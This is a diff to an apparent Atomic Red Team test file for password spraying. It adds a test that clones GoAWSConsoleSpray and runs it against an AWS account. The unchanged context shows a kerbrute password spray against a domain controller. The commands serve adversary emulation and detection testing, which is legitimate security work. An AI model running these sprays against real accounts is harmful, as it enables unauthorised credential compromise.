@@ -288,4 +288,31 @@ atomic_tests:
     command: |
       cd $env:temp
       .\kerbrute.exe passwordspray --dc #{domaincontroller} -d #{domain} $env:temp\passwordspray.txt password132 
-      
+- name: AWS - Password Spray an AWS using GoAWSConsoleSpray
+  auto_generated_guid: 9c10d16b-20b1-403a-8e67-50ef7117ed4e
+  description: |
+    GoAWSConsoleSpray is a tool that can be used to spray AWS IAM Console Credentials in order to identify a valid login for a user account built by WhiteOakSecurity. For more details reagrding the tool, check - https://www.whiteoaksecurity.com/blog/goawsconsolespray-password-spraying-tool/
+  supported_platforms:
+  - iaas:aws
+  input_arguments:
+    aws_account_id:
+      description: ID of the AWS account
+      type: String
+      default: "XXXXXXXX"
+  dependencies:
+    - description: |
+        Check if go is installed
+      prereq_command: |
+        go version
+      get_prereq_command: |
+        echo Install GO
+  executor:
+    command: |
+       cd /tmp
+       git clone git@github.com:WhiteOakSecurity/GoAWSConsoleSpray.git
+       cd /tmp/GoAWSConsoleSpray
+       go run main.go GoAWSConsoleSpray -a #{aws_account_id} -u PathToAtomicsFolder/T1110.003/src/aws_users.txt -p PathToAtomicsFolder/T1110.003/src/aws_passwords.txt
+    cleanup_command: |
+       rm -rf /tmp/GoAWSConsoleSpray
+    name: sh
+    elevation_required: false
